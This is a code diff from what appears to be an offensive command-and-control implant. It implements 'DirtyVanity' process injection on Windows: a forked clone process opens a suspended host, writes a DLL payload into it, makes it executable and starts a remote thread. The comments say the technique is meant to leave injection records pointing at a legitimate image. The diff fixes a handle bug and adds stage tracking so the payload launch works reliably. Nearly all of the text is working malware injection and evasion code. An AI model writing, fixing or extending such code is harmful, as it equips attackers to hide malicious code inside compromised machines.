@@ -261,18 +261,24 @@ typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void
  * remote threads, no inherited-runtime poisoning, identical image. */
 typedef struct {
 	volatile LONG go;
-	void * host;      /* suspended host pre-created by the healthy parent;
-	                   * the INHERIT_HANDLES fork copies the handle table
-	                   * 1:1, so the same VALUE works inside the clone */
+	DWORD  host_pid;  /* suspended host pre-created by the healthy parent.
+	                   * PID, not handle: the fork's handle-table copy does
+	                   * not guarantee value stability, a PID is process-
+	                   * global; the clone re-opens it with a raw
+	                   * NtOpenProcess */
 	char * payload;   /* dll bytes already mirrored into the clone (RX) */
 	int    plen;
 	void * param;     /* parameter blob already mirrored (RW) */
 	int    plen_arg;
+	volatile LONG stage;  /* trampoline progress: the parent reads this
+	                       * copy back through the clone handle */
+	volatile LONG last_st;/* NTSTATUS of the failing call, if any */
 } DV_MAILBOX;
 
 static DV_MAILBOX dv_mailbox = { 0, NULL, NULL, 0, NULL, 0 };
 static HANDLE dv_clone_handle = NULL;
 static DWORD  dv_clone_pid = 0;
+static DWORD  dv_host_pid = 0;
 
 /* runs INSIDE the clone. The cloned user-mode runtime is a torn snapshot
  * (heap locks, FLS, RPC bindings mid-flight): a full beacon payload dies
@@ -285,41 +291,72 @@ static DWORD  dv_clone_pid = 0;
  * method selects them). The new session comes from the healthy host
  * while every injection record inside the clone points at our own
  * legitimate image - the DirtyVanity contract. */
-static void dv_clone_launch(void * host, char * payload, int plen, void * param, int plen_arg) {
+static void dv_clone_launch(DWORD host_pid, char * payload, int plen, void * param, int plen_arg) {
 	void * remote;
 	void * rparam = NULL;
 	SIZE_T got = 0;
 	DWORD  oldp = 0;
+	HANDLE host;
 	HANDLE ht;
 
-	if (host == NULL)
+	if (host_pid == 0) {
+		dv_mailbox.stage = 2;
 		return;
+	}
+	dv_mailbox.stage = 10; /* woke */
+
+	/* PROCESS_VM_OPERATION | VM_WRITE | VM_READ | CREATE_THREAD | QUERY */
+	host = beacon_OpenProcess(0x1F0FFF, FALSE, host_pid);
+	if (host == NULL) {
+		dv_mailbox.last_st = (LONG)GetLastError();
+		dv_mailbox.stage = 20;
+		return;
+	}
+	dv_mailbox.stage = 21;
 
 	remote = beacon_VirtualAllocEx(host, NULL, (SIZE_T)plen,
 	                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (remote == NULL)
+	if (remote == NULL) {
+		dv_mailbox.last_st = (LONG)GetLastError();
+		dv_mailbox.stage = 30;
 		return;
-	if (!beacon_WriteProcessMemory(host, remote, payload, (SIZE_T)plen, &got) || got != (SIZE_T)plen)
+	}
+	dv_mailbox.stage = 31;
+
+	if (!beacon_WriteProcessMemory(host, remote, payload, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
+		dv_mailbox.last_st = (LONG)GetLastError();
+		dv_mailbox.stage = 40;
 		return;
+	}
+	dv_mailbox.stage = 41;
+
 	beacon_VirtualProtectEx(host, remote, (SIZE_T)plen, PAGE_EXECUTE_READ, &oldp);
+	dv_mailbox.stage = 50;
 
 	if (plen_arg > 0) {
 		rparam = beacon_VirtualAllocEx(host, NULL, (SIZE_T)plen_arg,
 		                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		if (rparam != NULL)
+		if (rparam != NULL) {
 			beacon_WriteProcessMemory(host, rparam, param, (SIZE_T)plen_arg, &got);
+			dv_mailbox.stage = 51;
+		}
 	}
 
 	ht = beacon_CreateRemoteThread(host, NULL, 0, (LPTHREAD_START_ROUTINE)remote, rparam, 0, NULL);
-	if (ht != NULL)
-		CloseHandle(ht); /* kernel32 close: syscall-thin, no runtime state */
+	if (ht == NULL) {
+		dv_mailbox.last_st = (LONG)GetLastError();
+		dv_mailbox.stage = 60;
+		return;
+	}
+	CloseHandle(ht); /* kernel32 close: syscall-thin, no runtime state */
+	dv_mailbox.stage = 99; /* launched */
 }
 
 void dv_nursery_trampoline(void * unused) {
 	(void)unused;
 	while (!dv_mailbox.go)
 		Sleep(200);
-	dv_clone_launch(dv_mailbox.host, dv_mailbox.payload, dv_mailbox.plen,
+	dv_clone_launch(dv_mailbox.host_pid, dv_mailbox.payload, dv_mailbox.plen,
 	                dv_mailbox.param, dv_mailbox.plen_arg);
 	for (;;)
 		Sleep(60000);
@@ -358,7 +395,8 @@ void dv_nursery_init(void) {
 			spawn_log("dv: host pre-create failed gle=", (long)GetLastError());
 			return;
 		}
-		dv_mailbox.host = pi.hProcess;
+		dv_mailbox.host_pid = pi.dwProcessId;
+		dv_host_pid       = pi.dwProcessId;
 		/* pi.hThread stays suspended forever - the injected beacon owns
 		 * the host; keep the handle to avoid cleanup complexity */
 	}
@@ -425,6 +463,7 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 	}
 
 	mb.go       = 1;
+	mb.host_pid = dv_host_pid;
 	mb.payload  = (char *)remote; /* the clone launches the payload at its
 	                               * base (offset-0 convention); job-style
 	                               * offsets are not routed through the
@@ -440,6 +479,26 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 	}
 
 	spawn_log("dv: payload delivered to clone pid=", (long)dv_clone_pid);
+
+	/* read the trampoline's progress back through the clone handle (its
+	 * mailbox copy carries the stage) - the launcher is otherwise mute */
+	{
+		int i;
+		for (i = 0; i < 20; i++) {
+			DV_MAILBOX probe;
+			SIZE_T got2 = 0;
+			Sleep(150);
+			if (beacon_ReadProcessMemory(hc, &dv_mailbox, &probe, sizeof(probe), &got2) && got2 == sizeof(probe)) {
+				if (probe.stage >= 99 || probe.stage >= 20) {
+					spawn_log("dv: launcher stage=", (long)probe.stage);
+					if (probe.stage < 99)
+						spawn_log("dv: launcher last_st=", (long)probe.last_st);
+					break;
+				}
+			}
+		}
+	}
+
 	dv_clone_pid = 0; /* one-shot: the handle stays for nothing further */
 	return TRUE;
 #endif
